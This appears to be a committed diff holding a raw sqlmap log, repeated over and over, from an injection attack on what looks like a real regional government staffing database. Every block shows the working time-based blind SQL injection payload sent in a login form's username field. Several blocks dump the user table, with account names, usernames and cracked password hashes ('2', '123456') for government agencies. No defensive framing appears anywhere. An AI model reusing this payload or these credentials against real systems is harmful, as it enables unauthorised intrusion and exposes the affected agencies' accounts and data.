@@ -1,0 +1,639 @@
+sqlmap identified the following injection point(s) with a total of 280 HTTP(s) requests:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP, PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: sib_db
+[12 tables]
++-------------------------+
+| user                    |
+| usulan_keb\x04\x01tuhan |
+| a_jabfungum             |
+| abk                     |
+| kelas_jabatan           |
+| master_pegawai_fpp      |
+| tb_01                   |
+| usulan_ib               |
+| usulan_ig               |
+| usulan_mutasi           |
+| usulan_pi               |
+| usulan_ud               |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+Table: user
+[1 entry]
++----+--------------------+--------------------------------------+---------+----------+----------+
+| id | nama               | pass                                 | level   | status   | username |
++----+--------------------+--------------------------------------+---------+----------+----------+
+| 1  | Administrator      | c81e728d9d4c2f636f067f89cc14862c (2) | A       | 1        | 1        |
++----+--------------------+--------------------------------------+---------+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+Table: user
+[1 entry]
++----+--------------------+--------------------------------------+---------+----------+----------+
+| id | nama               | pass                                 | level   | status   | username |
++----+--------------------+--------------------------------------+---------+----------+----------+
+| 1  | Administrator      | c81e728d9d4c2f636f067f89cc14862c (2) | A       | 1        | 1        |
++----+--------------------+--------------------------------------+---------+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+Table: user
+[2 entries]
++----+--------------------+-------------------------------------------+---------+----------+------------+
+| id | nama               | pass                                      | level   | status   | username   |
++----+--------------------+-------------------------------------------+---------+----------+------------+
+| 1  | Administrator      | c81e728d9d4c2f636f067f89cc14862c (2)      | A       | 1        | 1          |
+| 2  | Sekretariat Daerah | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0100000000 |
++----+--------------------+-------------------------------------------+---------+----------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+Table: user
+[7 entries]
++----+---------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+| id | nama                                                                      | pass                                      | level   | status   | username   |
++----+---------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+| 1  | Administrator                                                             | c81e728d9d4c2f636f067f89cc14862c (2)      | A       | 1        | 1          |
+| 2  | Sekretariat Daerah                                                        | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0100000000 |
+| 3  | Sekretariat DPRD                                                          | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0200001000 |
+| 4  | Inspektorat                                                               | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0300000000 |
+| 5  | Badan Kepegawaian Daerah                                                  | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0400000000 |
+| 6  | Badan Perencanaan, Penelitian, dan Pengembangan Daerah                    | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0500000000 |
+| 7  | \tDinas Pemberdayaan Perempuan, Perlindungan Anak, dan Keluarga Berencana | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0600000000 |
++----+---------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.22, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+[12 tables]
++--------------------+
+| user               |
+| usulan_kebtuhan  |
+| a_jabfungum        |
+| abk                |
+| kelas_jabatan      |
+| master_pegawai_fpp |
+| tb_01              |
+| usulan_ib          |
+| usulan_ig          |
+| usulan_mutasi      |
+| usulan_pi          |
+| usulan_ud          |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3 AND (SELECT 2144 FROM (SELECT(SLEEP(2)))TugR)-- uNan21=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.22
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: sib_db
+Table: user
+[8 entries]
++----+--------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+| id | nama                                                                     | pass                                      | level   | status   | username   |
++----+--------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+| 1  | Administrator                                                            | c81e728d9d4c2f636f067f89cc14862c (2)      | A       | 1        | 1          |
+| 2  | Sekretariat Daerah                                                       | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0100000000 |
+| 3  | Sekretariat DPRD                                                         | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0200001000 |
+| 4  | Inspektorat                                                              | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0300000000 |
+| 5  | Badan Kepegawaian Daerah                                                 | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0400000000 |
+| 6  | Badan Perencanaan, Penelitian, dan Pengembangan Daerah                   | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0500000000 |
+| 7  | 	Dinas Pemberdayaan Perempuan, Perlindungan Anak, dan Keluarga Berencana | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0600000000 |
+| 8  | Dinas Lingkungan Hidup                                                   | e10adc3949ba59abbe56e057f20f883e (123456) | U       | 1        | 0700000000 |
++----+--------------------------------------------------------------------------+-------------------------------------------+---------+----------+------------+
+
